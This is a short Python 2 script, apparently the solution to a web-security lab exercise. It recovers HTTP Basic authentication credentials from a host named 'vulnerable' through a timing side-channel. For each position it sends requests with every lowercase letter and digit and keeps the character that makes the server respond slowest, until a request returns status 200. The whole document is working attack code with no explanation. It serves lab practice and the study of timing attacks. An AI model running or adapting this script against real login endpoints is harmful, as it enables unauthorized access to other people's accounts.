import base64, httplib, sys, time

if __name__ == '__main__':
    prefix = sys.argv[1]
    conn = httplib.HTTPConnection('vulnerable')
    ans = None
    charset = range(ord('a'), ord('z')+1) + range(ord('0'), ord('9')+1)
    while True:
        maxtime = 0
        char = None
        for i in charset:
            username_password = prefix + chr(i)
            headers = {'Host': 'vulnerable',
                       'Authorization': 'Basic ' + base64.b64encode(username_password)}
            starttime = time.time()
            conn.request('GET', '/authentication/example2/', '', headers)
            res = conn.getresponse()
            res.read()
            duration = time.time() - starttime
            print '%s -> %f' % (username_password, duration)
            if res.status == 200:
                ans = username_password
                break
            if duration > maxtime:
                maxtime = duration
                char = i
        if ans != None:
            break
        prefix += str(chr(char))
    conn.close()
    print ans
